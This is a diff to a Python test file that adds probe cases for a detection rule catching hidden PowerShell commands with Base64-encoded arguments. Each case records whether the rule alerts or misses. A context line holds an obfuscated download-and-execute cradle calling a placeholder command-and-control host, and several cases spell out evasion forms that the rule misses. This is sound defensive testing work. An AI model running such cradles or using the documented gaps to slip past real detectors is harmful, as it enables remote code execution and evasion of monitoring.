@@ -106,6 +106,37 @@ def rule001_cases():
         r1("R1-G05", "documented-gap", "Cradle assembled from string pieces defeats keyword matching", EXPLORER, PS,
            "powershell -c \"$u='https://c2-placeholder.example/a'; &('i'+'e'+'x') ((New-Object ('Net.Web'+'Client')).('Download'+'String')($u))\"",
            False),
+        # --- PROBE cases: forms of the Base64 argument written to see what the rule does with the text. ---
+        # Whether PowerShell accepts each form is reasoning, NOT tested. No fetched source describes these forms, so none
+        # carries a source tag. expected_detected is what the unchanged rule actually returned when each case was run.
+        # A miss is labelled documented-gap and says when it would be a real attack; an alert is labelled probe-alert.
+        r1("R1-X01", "documented-gap",
+           "PROBE: Base64 value wrapped in double quotes after -enc. The rule MISSES it: the value must start with a Base64 character "
+           "and a quote is not one. Becomes a real attack only if PowerShell accepts a quoted -EncodedCommand value and decodes it "
+           "(reasoning, not tested). This case shows only what the rule does with that text.",
+           EXPLORER, PS, f'powershell -w hidden -enc "{B64}"', False),
+        r1("R1-X02", "probe-alert",
+           "PROBE: line break between -enc and the Base64 value. The rule ALERTS: \\s+ also matches a line break. Whether PowerShell "
+           "accepts this form is reasoning, not tested. This case shows only what the rule does with that text.",
+           EXPLORER, PS, f"powershell -w hidden -enc\n{B64}", True),
+        r1("R1-X03", "probe-alert",
+           "PROBE: Base64 value split by a line break after its first 40 characters. The rule ALERTS: the first piece alone is over "
+           "the 16-character floor. Whether PowerShell accepts the split value is reasoning, not tested. This case shows only what "
+           "the rule does with that text.",
+           EXPLORER, PS, f"powershell -w hidden -enc {B64[:40]}\n{B64[40:]}", True),
+        r1("R1-X04", "documented-gap",
+           "PROBE: Base64 value split by a line break after its first 8 characters. The rule MISSES it: no run of 16 Base64 "
+           "characters follows the flag. Becomes a real attack only if PowerShell accepts a Base64 value broken by a line break and "
+           "decodes the joined pieces (reasoning, not tested). This case shows only what the rule does with that text.",
+           EXPLORER, PS, f"powershell -w hidden -enc {B64[:8]}\n{B64[8:]}", False),
+        r1("R1-X05", "probe-alert",
+           "PROBE: five spaces between -enc and the Base64 value. The rule ALERTS: \\s+ matches any run of whitespace. Whether "
+           "PowerShell accepts this form is reasoning, not tested. This case shows only what the rule does with that text.",
+           EXPLORER, PS, f"powershell -w hidden -enc     {B64}", True),
+        r1("R1-X06", "probe-alert",
+           "PROBE: a tab between -enc and the Base64 value. The rule ALERTS: \\s+ matches a tab. Whether PowerShell accepts this "
+           "form is reasoning, not tested. This case shows only what the rule does with that text.",
+           EXPLORER, PS, f"powershell -w hidden -enc\t{B64}", True),
     ]
     return cases
 
